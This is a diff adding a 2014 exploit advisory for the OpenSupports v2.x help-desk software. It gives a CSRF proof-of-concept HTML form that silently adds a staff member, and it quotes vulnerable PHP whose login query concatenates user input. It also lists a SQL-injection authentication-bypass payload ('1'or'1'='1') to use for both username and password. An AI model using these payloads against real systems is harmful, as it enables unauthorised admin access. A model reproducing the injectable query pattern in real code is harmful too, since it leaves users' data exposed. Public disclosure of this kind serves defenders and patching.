@@ -1,0 +1,59 @@
+[+] Author: TUNISIAN CYBER
+[+] Exploit Title: OpenSupports v2.x AuthBypass/CSRF Vulnerabilities
+[+] Date: 15-03-2014
+[+] Category: WebApp
+[+] Version: 2.x
+[+] Tested on: KaliLinux/Windows 7 Pro
+[+] CWE: CWE-302/CWE-89
+[+] Vendor: http://www.opensupports.com/
+[+] Friendly Sites: na3il.com,th3-creative.com
+[+] Twitter: @TCYB3R
+
+1.OVERVIEW:
+OpenSupports v2.x suffers from a CSRF and authentication bypass Vulnerabilities.
+
+2.Version:
+2.x
+
+3.Background:
+http://www.opensupports.com/wiki/index.php?title=Main_Page
+
+4.Proof Of Concept:
+CSRF:Add Staff Members
+<html>
+<form method="POST" name="form0" action="http://localhost/demo/admin/staffadmin.php?id=agregar">
+<input type="hidden" name="nombre" value="TCYB3Rx20x"/>
+<input type="hidden" name="email" value="g4k@hotmail.esxxx"/>
+<input type='submit' name='Submit4' value="Agregar">
+</form>
+</html>
+
+Authentication Bypass:
+File: staff.php
+[PHP]
+if(isset($_POST['user'])){
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$userreg=mysql_query("select * from staff WHERE user='$user' AND pass='$pass'") or die ("ERROR 1");
+[PHP]
+
+Username:1'or'1'='1
+Password:1'or'1'='1
+
+5.Solution(s):
+no contact from vendor
+
+6.TIME-LINE:
+2014-13-03: Vulnerability was discovered.
+2014-13-03: Contact with vendor.
+2014-14-03: No reply.
+2014-15-03: No reply.
+2014-15-03: Vulnerability Published
+
+
+
+7.Greetings:
+Xmax-tn
+Xtech-set
+N43il
+Sec4ver,E4A Members
